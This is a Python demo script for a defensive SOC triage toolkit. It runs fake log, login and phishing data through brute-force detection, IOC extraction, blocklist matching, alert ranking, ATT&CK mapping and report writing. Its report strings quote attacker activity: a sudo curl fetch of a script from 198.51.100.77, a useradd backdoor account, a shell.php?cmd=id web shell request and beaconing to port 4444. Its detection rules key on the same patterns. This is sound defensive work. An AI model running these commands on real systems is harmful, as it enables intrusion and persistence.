#!/usr/bin/env python3
"""End-to-end triage demo: runs the whole SOC workflow on the FAKE sample data.

    python demo.py                      # writes reports to demo_output/
    python demo.py --output-dir out     # choose another folder

Flow: parse logs -> detect attacks -> analyse logins and emails -> extract IOCs -> match
threat intel -> prioritise alerts -> map to ATT&CK -> build a timeline -> write a report.
"""
from __future__ import annotations

import argparse
import sys
from pathlib import Path
from typing import Dict, List

from soc_common.formatting import format_table, heading
from soc_common.io_utils import write_json
from soc_common.schema import parse_timestamp
from soc_common.validation import cli_guard
from tools.alert_prioritizer.core import alerts_from_dicts, load_assets, score_alerts
from tools.attack_mapper.core import load_mapping, map_behaviours
from tools.bruteforce_detector.core import detect
from tools.intel_matcher.core import load_blocklist, match_iocs
from tools.ioc_extractor.core import extract_iocs, read_sources, total_count
from tools.log_parser.core import parse_files
from tools.login_analyzer.core import analyze_logins, load_logins
from tools.phishing_analyzer.core import analysis_iocs, analyze_file
from tools.report_generator.core import build_html, build_markdown
from tools.timeline_builder.core import build_timeline, filter_events

ROOT = Path(__file__).resolve().parent
DATA = ROOT / "sample_data"
KIND_TO_CATEGORY = {"ip_bruteforce": "brute_force", "password_spray": "password_spray", "user_targeted": "credential_stuffing"}


def stage(n: int, title: str) -> None:
    print("\n" + heading("STAGE %d: %s" % (n, title)))


def derive_behaviours(events) -> List[str]:
    """Turn raw evidence in the events into ATT&CK behaviour names (simple, readable rules)."""
    found: List[str] = []

    def add(name: str) -> None:
        if name not in found:
            found.append(name)

    for e in events:
        cmd = str(e.extra.get("command", ""))
        if e.action == "sudo" and ("curl " in cmd or "wget " in cmd):
            add("tool_download")
        if e.action == "sudo" and ("useradd" in cmd or "adduser" in cmd):
            add("account_creation")
        if e.action == "sudo":
            add("sudo_abuse")
        if e.source == "firewall" and e.extra.get("direction") == "OUT" and e.extra.get("dport") not in (None, 80, 443, 53) and e.outcome == "allow":
            add("c2_beaconing")
        if e.source == "web" and "shell.php" in str(e.extra.get("path", "")):
            add("webshell")
        if e.source == "firewall" and e.outcome == "deny" and e.extra.get("direction") == "IN":
            add("port_scan")
    return found


def condense(entries):
    """Keep the story, drop the noise: key moments, successes and non-login events, plus the first failed logins."""
    out, failures = [], 0
    for t in entries:
        e = t.event
        is_login_noise = e.action in ("ssh_login", "ssh_invalid_user") and e.outcome == "failure"
        if t.marker or not is_login_noise:
            out.append(t)
        elif failures < 3:
            failures += 1
            out.append(t)
    return out


@cli_guard
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Run the full SOC triage flow on the fake sample data.")
    ap.add_argument("--output-dir", default=str(ROOT / "demo_output"), help="where to write results (default: demo_output/)")
    ap.add_argument("--year", type=int, default=2026, help="year for syslog timestamps in the sample logs (default 2026)")
    args = ap.parse_args(argv)
    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    print("SOC TRIAGE TOOLKIT - end-to-end demo (all data is FAKE)")

    # ---- 1. parse
    stage(1, "Parse and normalise logs")
    parsed = parse_files([DATA / "auth.log", DATA / "webserver_access.log", DATA / "firewall.log"], "auto", args.year)
    events = parsed.events
    print("%d lines -> %d normalised events (%s)" % (parsed.total_lines, len(events), ", ".join("%s=%d" % kv for kv in sorted(parsed.by_source.items()))))

    # ---- 2. brute force
    stage(2, "Detect brute force and password spraying")
    findings = detect(events)
    print(format_table(["severity", "type", "source", "fails", "login after?"], [[f.severity.name, f.kind, f.key, f.failures, "YES" if f.success_after else "no"] for f in findings]))

    # ---- 3. suspicious logins
    stage(3, "Analyse logins for impossible travel and anomalies")
    login_findings = analyze_logins(load_logins(DATA / "logins.csv"))
    print(format_table(["severity", "user", "signals"], [[f.severity.name, f.record.user, ",".join(f.signals)] for f in login_findings]))

    # ---- 4. phishing
    stage(4, "Analyse suspicious emails")
    emails = sorted((analyze_file(p) for p in sorted((DATA / "emails").glob("*.eml"))), key=lambda a: -a.score)
    print(format_table(["score", "severity", "file", "top reason"], [[a.score, a.severity.name, Path(a.path).name, a.findings[0][1] if a.findings else "-"] for a in emails], max_width=60))
    worst = emails[0]

    # ---- 5. IOCs + intel
    stage(5, "Extract IOCs and match them against the local blocklist")
    iocs = extract_iocs(read_sources([worst.path]))
    for kind, values in analysis_iocs(worst).items():
        iocs.setdefault(kind, [])
        iocs[kind] = sorted(set(iocs[kind]) | set(values))
    attackers = sorted({f.key for f in findings if f.kind != "user_targeted"})
    iocs["ip"] = sorted(set(iocs.get("ip", [])) | set(attackers))
    blocklist = load_blocklist(DATA / "blocklist.csv")
    matches = match_iocs(iocs, blocklist)
    print("%d IOCs extracted, %d blocklist matches (offline)" % (total_count(iocs), len(matches)))
    print(format_table(["severity", "ioc", "matched by", "source"], [[m.severity.name, m.ioc, m.indicator, m.source] for m in matches], max_width=44))
    bad_ips = {m.ioc for m in matches if m.ioc_type == "ip"}

    # ---- 6. prioritise
    stage(6, "Turn detections into alerts and rank them")
    raw_alerts: List[Dict] = []
    for i, f in enumerate(findings, start=1):
        tags = (["successful_login_after_failures"] if f.success_after else []) + (["known_bad_ip"] if f.key in bad_ips else []) + ["internet_facing"]
        raw_alerts.append({"id": "D-%02d" % i, "title": "%s from %s (%d failures)" % (f.kind.replace("_", " "), f.key, f.failures), "severity": f.severity.name,
                           "category": KIND_TO_CATEGORY.get(f.kind, f.kind), "asset": "web01", "src_ip": f.key if f.kind != "user_targeted" else "", "tags": tags,
                           "timestamp": f.first_seen.strftime("%Y-%m-%dT%H:%M:%SZ")})
    for j, lf in enumerate(login_findings, start=1):
        if lf.severity >= 2:
            raw_alerts.append({"id": "L-%02d" % j, "title": "Suspicious login for %s (%s)" % (lf.record.user, ",".join(lf.signals)), "severity": lf.severity.name,
                               "category": "impossible_travel" if "impossible_travel" in lf.signals else "valid_account_login", "asset": "laptop-%s" % lf.record.user,
                               "user": lf.record.user, "src_ip": lf.record.ip, "tags": list(lf.signals), "timestamp": lf.record.timestamp.strftime("%Y-%m-%dT%H:%M:%SZ")})
    raw_alerts.append({"id": "E-01", "title": "Phishing: %s" % worst.subject, "severity": worst.severity.name, "category": "phishing_email", "asset": "mail01",
                       "src_ip": analysis_iocs(worst)["ip"][0] if analysis_iocs(worst)["ip"] else "", "tags": ["known_bad_ip"] if analysis_iocs(worst)["ip"] and analysis_iocs(worst)["ip"][0] in bad_ips else [],
                       "timestamp": parse_timestamp("2026-10-28T03:40:55Z").strftime("%Y-%m-%dT%H:%M:%SZ")})
    ranked = score_alerts(alerts_from_dicts(raw_alerts), load_assets(DATA / "assets.json"))
    print(format_table(["#", "score", "priority", "id", "title"], [[i + 1, s.score, s.severity.name, s.alert.id, s.alert.title] for i, s in enumerate(ranked)], max_width=60))
    write_json(out_dir / "ranked_alerts.json", [s.to_dict() for s in ranked])

    # ---- 7. ATT&CK
    stage(7, "Map behaviours to MITRE ATT&CK")
    behaviours = [s.alert.category for s in ranked] + derive_behaviours(events)
    techniques, _unknown = map_behaviours(behaviours, load_mapping())
    print(format_table(["technique", "name", "tactic(s)"], [[t.technique_id, t.name, ", ".join(t.tactics)] for t in techniques], max_width=56))

    # ---- 8. timeline
    stage(8, "Build the incident timeline (02:10-02:35 UTC)")
    window = filter_events(events, start=parse_timestamp("2026-10-28T02:10:00Z"), end=parse_timestamp("2026-10-28T02:35:00Z"))
    timeline = condense(build_timeline(window))
    print("%d events in the window, %d shown after condensing; key moments:" % (len(window), len(timeline)))
    for t in timeline:
        if t.marker:
            print("  %s  %s" % (t.event.timestamp.strftime("%H:%M:%S"), t.marker))

    # ---- 9. report
    stage(9, "Write the triage report")
    top = findings[0]
    case = {
        "case_id": "INC-FAKE-001", "analyst": "Sujith Kumar", "created": "2026-10-28 04:00 UTC", "title": "SSH brute force leading to compromise of web01",
        "verdict": "True positive", "severity": ranked[0].severity.name,
        "notice": "All data in this report is FAKE sample data.", "categories": sorted({s.alert.category for s in ranked}),
        "summary": ("%s made %d failed SSH logins against web01 within a few minutes (including %s non-existent usernames), then logged in successfully as '%s'. "
                    "Shortly afterwards the account ran curl and useradd through sudo, a web shell was requested from the same IP, and web01 began beaconing to %s on port 4444. "
                    "Both IPs are on the local blocklist. A separate phishing email, a password spray and a distributed attack on 'admin' were also detected." % (
                        top.key, top.failures, "several", next((t.event.user for t in timeline if "POSSIBLE COMPROMISE" in t.marker), "deploy"), "198.51.100.77")),
        "evidence": [{"title": "Brute force with success", "detail": top.reasons[1] if len(top.reasons) > 1 else top.reasons[0]},
                     {"title": "Suspicious privileged commands", "detail": "sudo curl http://198.51.100.77/x.sh and sudo useradd support2 by user deploy"},
                     {"title": "Web shell", "detail": "GET /uploads/shell.php?cmd=id from the attacker IP"},
                     {"title": "Command-and-control beaconing", "detail": "6 outbound connections to 198.51.100.77:4444 about 5 minutes apart"},
                     {"title": "Phishing email", "detail": "%s scored %d/100 (%s)" % (Path(worst.path).name, worst.score, worst.severity.name)}],
        "iocs": {k: v for k, v in iocs.items() if k in ("ip", "domain", "url", "email", "sha256")},
        "attack": [t.to_dict() for t in techniques],
        "timeline": [{"timestamp": t.event.timestamp.strftime("%Y-%m-%d %H:%M:%S"), "message": t.event.message, "marker": t.marker} for t in timeline],
    }
    write_json(out_dir / "case.json", case)
    (out_dir / "report.md").write_text(build_markdown(case), encoding="utf-8")
    (out_dir / "report.html").write_text(build_html(case), encoding="utf-8")
    for name in ("ranked_alerts.json", "case.json", "report.md", "report.html"):
        print("  wrote %s" % (out_dir / name))
    print("\nDone. Open %s in a browser to see the finished report." % (out_dir / "report.html"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
